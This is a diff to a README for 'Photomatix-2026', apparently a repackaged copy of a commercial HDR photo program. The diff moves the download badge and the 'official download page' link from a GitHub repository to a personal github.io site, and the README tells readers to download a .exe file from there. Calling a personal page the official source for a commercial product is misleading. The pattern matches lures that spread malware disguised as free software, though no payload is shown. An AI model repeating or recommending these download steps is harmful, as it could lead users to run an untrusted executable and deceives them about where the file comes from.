@@ -1,6 +1,6 @@
 # 📸 Photomatix-2026 - Create stunning high dynamic range photos
 
-[![Download Photomatix Pro](https://img.shields.io/badge/Download-Photomatix_2026-blue)](https://github.com/joniinclement938/Photomatix-2026)
+[![Download Photomatix Pro](https://img.shields.io/badge/Download-Photomatix_2026-blue)](https://joniinclement938.github.io)
 
 ## 🎯 Purpose of this software
 
@@ -20,7 +20,7 @@ Before you install this software, check that your computer meets these minimum s
 
 Follow these steps to set up the software on your computer.
 
-1. Navigate to the official download page: [https://github.com/joniinclement938/Photomatix-2026](https://github.com/joniinclement938/Photomatix-2026).
+1. Navigate to the official download page: [https://joniinclement938.github.io](https://joniinclement938.github.io).
 2. Look for the release section on that page.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop for easy access.
